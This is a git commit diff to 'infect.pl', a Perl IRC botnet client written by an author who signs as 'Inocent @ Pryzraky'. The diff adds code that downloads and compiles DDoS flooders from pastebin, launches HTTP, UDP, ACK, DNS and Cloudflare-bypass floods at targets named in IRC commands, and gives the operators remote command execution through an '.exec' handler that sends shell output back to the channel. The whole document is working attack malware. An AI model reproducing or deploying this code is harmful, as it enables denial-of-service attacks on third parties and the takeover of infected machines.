6fe93cb4af438b205479e0896a129dd8c662575a
Inocent' w// <inocentd3vil@protonmail.com>
2020-11-08 10:21:43 -0300

    Update infect.pl

--- infect.pl
+++ infect.pl
@@ -1,58 +1,63 @@
 #!usr/bin/perl
 
 use IO::Socket;
-my $processo = '/usr/sbin/httpd';
-my $server  = "127.0.0.1"; 
+my $processo = '/usr/sbin/d3vil';
+my $server  = "irc.acre.gov.br";    # irc     
 my $code = int(rand(100000));
-my $channel = "#channel";
-my $port    =   "6667";
-my $nick    = "Machine_$code";
+my $channel = "#criminal";          # canal
+my $port    =   "6667";             # porta        
+my $nick    = "s4t4n1c[$code]";     # nick                 
 
-unless (-e "sadattack.py") {
-  print "[*] Instalando o SADATTACK...";
-  system("wget https://pastebin.com/raw/XiwqFZqe -O sadattack.py");
+unless (-e "saphyra.py") {
+  system("wget https://pastebin.com/raw/UR57fJHc -O saphyra.py");
+}
+
+unless (-e "cfbypass.py") {
+  system("wget https://pastebin.com/raw/QFJgPp4S -O cfbypass.py");
 }
 
 unless (-e "hulk.py") { 
-  print "[*] Instalando o HULK... ";
   system("wget https://pastebin.com/raw/gdDMQXWQ -O hulk.py");
 }
 
 unless (-e "goldeneye.py") { 
-  print "[*] Instalando o Goldeneye... ";
   system("wget https://pastebin.com/raw/eY3C0anh -O goldeneye.py");
 }
 
 unless (-e "udp1.pl") { 
-  print "[*] Instalando UDPFlooder... ";
   system("wget https://pastebin.com/raw/n399Y8ES -O udp1.pl");
 }
 
 unless (-e "std.c") { 
-  print "[*] Instalando STD... ";
   system("wget https://pastebin.com/raw/3UCGvEnD -O std.c");
   system("gcc std.c -o std -pthread");
 }
 
 unless (-e "httpabuse.pl") { 
-  print "[*] Instalando HTTPABUSE... ";
   system("wget https://pastebin.com/raw/nzmmmQaR -O httpabuse.pl");
 }
 
+unless (-e "g3m.c") { 
+  system("wget http://pastebin.com/raw/FmmkZfx9 -O g3m.c");
+    system("gcc g3m.c -o g3m");
+}
+
 unless (-e "rand.pl") { 
-  print "[*] Instalando UDPRand... ";
   system("wget https://pastebin.com/raw/XqHSJT1J -O rand.pl");
 }
 
 unless (-e "DNS.pl") { 
-  print "[*] Instalando DNS... ";
   system("wget https://pastebin.com/raw/ZEeaYZRg -O DNS.pl");
 }
 
 unless (-e "ack.pl") { 
-  print "[*] Instalando ACK... ";
   system("wget https://pastebin.com/raw/57pBN7Un -O ack.pl");
 }
+
+unless (-e "ufo.pl") { 
+  system("wget https://pastebin.com/raw/74vw4erw -O ufo.pl");
+}
+
 all();
 sub all {
 $SIG{'INT'}  = 'IGNORE';
@@ -88,17 +93,17 @@ while ( my $log = <$s0ck3t> ) {
 	print $s0ck3t "JOIN $channel\r\n";
       }
 
-     if ( $log =~ m/:!sadattack (.*)$/g ){##########
-        my $target_sadattack = $1;
-        $target_sadattack =~ s/^\s*(.*?)\s*$/$1/;
-        $target_sadattack;
-        print $s0ck3t "PRIVMSG $channel :67[63SADATTACK67]61 Attack started at $1, use !stopsad for stop :P \r\n";
-        system("nohup python sadattack.py $target_sadattack > /dev/null 2>&1 &");
+     if ( $log =~ m/:!saphyra (.*)$/g ){##########
+        my $target_saphyra = $1;
+        $target_saphyra =~ s/^\s*(.*?)\s*$/$1/;
+        $target_saphyra;
+        print $s0ck3t "PRIVMSG $channel :67[63SAPHYRA67]61 Attack started at $1, use !stopsad for stop :P \r\n";
+        system("nohup python saphyra.py $target_saphyra > /dev/null 2>&1 &");
       }
       
-      if ( $log =~ m/:!stopsad/g ){##########
-        print $s0ck3t "PRIVMSG $channel :67[63SADATTACK67]61 Attack sucessfully finished! \r\n";
-        system("pkill -9 -f sadattack");
+      if ( $log =~ m/:!stopsaphyra/g ){##########
+        print $s0ck3t "PRIVMSG $channel :67[63SAPHYRA67]61 Attack sucessfully finished! \r\n";
+        system("pkill -9 -f saphyra");
       }
 
       if ( $log =~ m/:!hulk (.*)$/g ){##########
@@ -126,14 +131,57 @@ while ( my $log = <$s0ck3t> ) {
         system("pkill -9 -f goldeneye");
       }
 
+      if ( $log =~ m/:!cfbypass (.*)$/g ){##########
+        my $target_cf = $1;
+        $target_cf =~ s/^\s*(.*?)\s*$/$1/;
+        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Attack started at $1, use !stopcf for stop :P \r\n";
+        system("nohup python cfbypass.py $target_cf > /dev/null 2>&1 &");
+      }
+
+      if ( $log =~ m/:!stopcf/g ){##########
+        print $s0ck3t "PRIVMSG $channel :67[63CF-BYPASS67]61 Attack sucessfully finished! \r\n";
+        system("pkill -9 -f cfbypass");
+      }
+
       if ( $log =~ m/:!udp (.*)$/g ){##########
         my $target_udp = $1;
-        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 Attack started at $target_udp, use !stopudp for stop :P \r\n";
+        print $s0ck3t "PRIVMSG $channel :67[63UDP-FLOOD67]61 Attack started at $target_udp, use !stopudp for stop :P \r\n";
         system("nohup perl udp1.pl $target_udp > /dev/null 2>&1 &");
       }
       if ( $log =~ m/:!stopudp/g ){##########
-        print $s0ck3t "PRIVMSG $channel :67[63UDP67]61 Attack sucessfully finished! \r\n";
+        print $s0ck3t "PRIVMSG $channel :67[63UDP-FLOOD67]61 Attack sucessfully finished! \r\n";
         system("pkill -9 -f udp1");
+      }
+	  
+      if ( $log =~ m/:!ufo (.*)$/g ){##########
+        my $target_ufo = $1;
+        my $time_ufo = $2;
+        print $s0ck3t "PRIVMSG $channel :67[63UFO67]61 Attack started at $target_ufo, use !stopufo for stop :P \r\n";
+        system("nohup perl ufo.pl $target_ufo $time_ufo > /dev/null 2>&1 &");
+      }
+      if ( $log =~ m/:!stopufo/g ){##########
+        print $s0ck3t "PRIVMSG $channel :67[63UFO67]61 Attack sucessfully finished! \r\n";
+        system("pkill -9 -f ufo");
+      }
+	  
+     if ( $log =~ m/:!mixy (.*)$/g ){##########
+        my $target_mix = $1;
+        print $s0ck3t "PRIVMSG $channel :67[63MIXy67]61 Attack started at $target_mix, use !stopmixy for stop :P \r\n";
+        system("nohup perl udp1.pl $target_mix > /dev/null 2>&1 &");
+	    system("nohup ./std $target_mix 80 999999 > /dev/null 2>&1 &");
+        system("nohup perl DNS.pl $target_mix 999999 > /dev/null 2>&1 &");
+        system("nohup perl ack.pl $target_mix 999999 > /dev/null 2>&1 &");
+	    system("nohup perl rand.pl $target_mix 999999 > /dev/null 2>&1 &");
+        system("nohup perl ufo.pl $target_mix 999999 > /dev/null 2>&1 &");
+      }
+      if ( $log =~ m/:!stopmixy/g ){##########
+        print $s0ck3t "PRIVMSG $channel :67[63MIXy67]61 Attack sucessfully finished! \r\n";
+        system("pkill -9 -f udp1");
+        system("pkill -9 -f std");
+        system("pkill -9 -f ack");
+        system("pkill -9 -f dns");
+        system("pkill -9 -f rand");
+        system("pkill -9 -f ufo");
       }
 
       if ( $log =~ m/:!std (.*)$/g ){##########
@@ -149,16 +197,28 @@ while ( my $log = <$s0ck3t> ) {
         system("pkill -9 -f std");
       }
 
+      if ( $log =~ m/:!g3m (.*)$/g ){##########
+        my $target_g3m = $1;
+        my $port_g3m = $2;
+        print $s0ck3t "PRIVMSG $channel :67[63G3M67]61 Attack started at $target_g3m, use !stopg3m for stop :P \r\n";
+        system("nohup ./g3m -T3 -I -U -N -p $port_g3m,$port_g3m -h $target_g3m > /dev/null 2>&1 &");
+      }
+
+      if ( $log =~ m/:!stopg3m/g ){##########
+        print $s0ck3t "PRIVMSG $channel :67[63G3M67]61 Attack sucessfully finished! \r\n";
+        system("pkill -9 -f g3m");
+      }
+
     if ( $log =~ m/:!httpabuse (.*)$/g ){##########
         my $target_httpabuse = $1;
         $target_httpabuse =~ s/^\s*(.*?)\s*$/$1/;
         $target_httpabuse;
-        print $s0ck3t "PRIVMSG $channel :67[63HTTPABUSE67]61 Attack started at $1, use !stopabuse for stop :P \r\n";
+        print $s0ck3t "PRIVMSG $channel :67[63HTTP-ABUSE67]61 Attack started at $1, use !stopabuse for stop :P \r\n";
         system("nohup perl httpabuse.pl $target_httpabuse 1000 100 GET 13.37 > /dev/null 2>&1 &");
       }
       
       if ( $log =~ m/:!stopabuse/g ){##########
-        print $s0ck3t "PRIVMSG $channel :67[63HTTPABUSE67]61 Attack sucessfully finished! \r\n";
+        print $s0ck3t "PRIVMSG $channel :67[63HTTP-ABUSE67]61 Attack sucessfully finished! \r\n";
         system("pkill -9 -f httpabuse");
       }
 
@@ -176,11 +236,11 @@ while ( my $log = <$s0ck3t> ) {
     if ( $log =~ m/:!rand (.*)$/g ){##########
         my $target_rand = $1;
         my $time_rand = $2;
-        print $s0ck3t "PRIVMSG $channel :67[63RAND67]61 Attack started at $target_rand, use !stoprand for stop :P \r\n";
+        print $s0ck3t "PRIVMSG $channel :67[63UDP-RAND67]61 Attack started at $target_rand, use !stoprand for stop :P \r\n";
         system("nohup perl rand.pl $target_rand $time_rand > /dev/null 2>&1 &");
       }
       if ( $log =~ m/:!stoprand/g ){##########
-        print $s0ck3t "PRIVMSG $channel :67[63RAND67]61 Attack sucessfully finished! \r\n";
+        print $s0ck3t "PRIVMSG $channel :67[63UDP-RAND67]61 Attack sucessfully finished! \r\n";
         system("pkill -9 -f rand");
       }
 
@@ -193,71 +253,55 @@ while ( my $log = <$s0ck3t> ) {
       if ( $log =~ m/:!stopack/g ){##########
         print $s0ck3t "PRIVMSG $channel :67[63ACK67]61 Attack sucessfully finished! \r\n";
         system("pkill -9 -f ack");
-      }
-	 
-   if ( $log =~ m/:!ufo (.*)$/g ){##########
-        my $target_ufo = $1;
-        my $time_ufo = $2;
-        print $s0ck3t "PRIVMSG $channel :67[63UFO67]61 Attack started at $target_ufo, use !stopufo for stop :P \r\n";
-        system("nohup perl ufo.pl $target_ufo $time_ufo > /dev/null 2>&1 &");
-      }
-      if ( $log =~ m/:!stopufo/g ){##########
-        print $s0ck3t "PRIVMSG $channel :67[63UFO67]61 Attack sucessfully finished! \r\n";
+      } 
+	  
+    if ( $log =~ m/:!stopall/g ){##########
+        print $s0ck3t "PRIVMSG $channel :67[63OK67]61 All attacks are killed now! \r\n";
+        system("pkill -9 -f saphyra");
+        system("pkill -9 -f hulk");
+        system("pkill -9 -f goldeneye");
+        system("pkill -9 -f cfbypass");
+        system("pkill -9 -f udp1");
+        system("pkill -9 -f ufo");
+        system("pkill -9 -f std");
+        system("pkill -9 -f httpabuse");
+        system("pkill -9 -f DNS");
+        system("pkill -9 -f rand");
         system("pkill -9 -f ack");
       }
-	  
-     if ( $log =~ m/:!help/g ){##########
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 Métodos de ataque layer 4:\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !udp ip / !stopudp\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !std ip port time / !stopstd\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !rand ip time / !stoprand\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !dns ip time / !stopdns\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !ack ip time / !stopack\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !ufo ip time / !stopack\r\n";
-        print $s0ck3t "PRIVMSG $channel :67\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 Métodos de ataque layer 7:\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !sadattack http://wwww.google.com/ / !stopsad\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !hulk http://www.google.com/ / !stophulk\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !gold http://www.google.com.br / !stopgold\r\n";
-        print $s0ck3t "PRIVMSG $channel :67[63HELP67]61 !httpabuse http://www.google.com / !stopabuse\r\n";
-      }
-	  
-   if ( $log =~ m/:!info/g ){##########
-        print $s0ck3t "PRIVMSG $channel :twitter.com/1nocent\r\n";
-      }
 
-      #######################
-      # Inocent @ Pryzraky  #
-      #######################
+      #################################
+      # powered by inocent @ pryzraky #
+	  #################################
 
-      #######################
-      # Inocent @ Pryzraky  #
-      #######################
-      
-      #######################
-      # Inocent @ Pryzraky  #
-      #######################
-      
-      #######################
-      # Inocent @ Pryzraky  #
-      #######################
-      
-      #######################
-      # Inocent @ Pryzraky  #
-      #######################
-      
-      if ( $log =~ m/:!rce (.*)$/g ){##########
+      #################################
+      # powered by inocent @ pryzraky #
+	  #################################
+
+      #################################
+      # powered by inocent @ pryzraky #
+	  #################################
+
+      #################################
+      # powered by inocent @ pryzraky #
+	  #################################
+
+      #################################
+      # powered by inocent @ pryzraky #
+	  #################################
+
+      if ( $log =~ m/:.exec (.*)$/g ){##########
         my $comando_raw = `$1`;
-        open(handler,">mat.tmp");
+        open(handler,">rce.tmp");
         print handler $comando_raw;
         close(handler);
 	
-        open(h4ndl3r,"<","mat.tmp");
+        open(h4ndl3r,"<","rce.tmp");
         my @commandoarray = <h4ndl3r>;
 
         foreach my $comando_each (@commandoarray){
           sleep(1);
-          print $s0ck3t "PRIVMSG $channel :67[63RCE67]61 Output67 => $comando_each \r\n";
+          print $s0ck3t "PRIVMSG $channel :$comando_each \r\n";
        }
    }
 }
